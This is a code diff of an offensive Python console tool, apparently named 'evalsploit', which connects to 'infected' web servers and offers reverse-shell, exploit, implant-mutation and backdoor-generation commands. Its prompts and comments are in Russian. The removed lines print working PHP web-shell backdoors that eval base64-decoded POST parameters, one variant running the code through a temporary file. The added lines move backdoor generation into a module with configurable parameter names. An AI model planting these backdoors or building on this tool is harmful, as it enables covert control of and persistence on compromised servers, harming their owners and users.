@@ -18,6 +18,9 @@ import modules.stat as stat
 import modules.rename as rn
 import modules.set as settings
 import modules.proxy as proxy
+import modules.generate as gen
+import modules.mutation as mutate
+
 
 import bypasses.trybypass as by
 import bypasses.exec as run
@@ -27,7 +30,8 @@ import scan.sbd as sbd
 import exploits.reverse as rs
 import exploits.exploit as x
 
-version = "2.6.0"
+version = "2.7.3"
+
 config = configparser.ConfigParser()
 zed= config.read('settings.ini')
 shell =config['SETTINGS']['shell']
@@ -36,6 +40,8 @@ listdir = config['SETTINGS']['ls']
 silent = config['SETTINGS']['silent']
 reverse = config['SETTINGS']['reverse']
 ts = config['SETTINGS']['send']
+Zc = config['SETTINGS']['Z']
+Vc = config['SETTINGS']['V']
 
 a=[]
 who = []
@@ -46,12 +52,12 @@ print("Введите заражённый url для коннекта")
 print("Или оставьте поле пустым, чтобы восстановить прошлую сессию")
 
 test = input("URL@evalsploit~: ")
-
 if test == "": url = config['SETTINGS']['url']
 else: 
     config['SETTINGS']['url'] = test
     with open('settings.ini', 'w') as configfile: config.write(configfile)
     url = test
+
 
 os.system('cls')
 
@@ -276,27 +282,23 @@ while True:
             if reverse == "ivan": rs.shell2(url,com,uagent)
 
 #=============== GEN ===============# 
-        case "gen": #Придумать распознование
-            if ts == "bypass":
-                print('''
-Классический байпас: 
-if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
-                      
-TMPEval:
-if(isset($_POST['Z'])){$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,"<?php \\n".base64_decode(str_replace($_POST['V'],'',$_POST['Z']))."\\n ?>");include_once($f);unlink($f);die();}
-''')
-            if ts in ("classic","simple"):
-                print('''
-Классика:
-if(isset($_POST['Z'])){@eval($_POST['Z']);die();}
-
-TMPEval:
-if(isset($_POST['Z'])){$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,"<?php \\n".$_POST['Z']."\\n ?>");include_once($f);unlink($f);die();}
-                      ''')
+        case "gen": 
+            gen.backdoor(ts,Zc,Vc)
 
 #============= EXPLOIT =============# 
         case "exploit": #Крутая штука, привинтить к реверсу
             x.steightone(url,com,uagent)
+
+        case "mutate":
+            mutate.mutate(url,uagent)
+
+        case "reset":
+            print("Ппц, нафиг эта функция нужна-то?")
+            config = configparser.ConfigParser()
+            config.read('settings.ini')
+            config['SETTINGS']['Z'] = "Z"
+            config['SETTINGS']['V'] = "V"
+            with open('settings.ini', 'w') as configfile: config.write(configfile)
 
         case "help": hi()
 
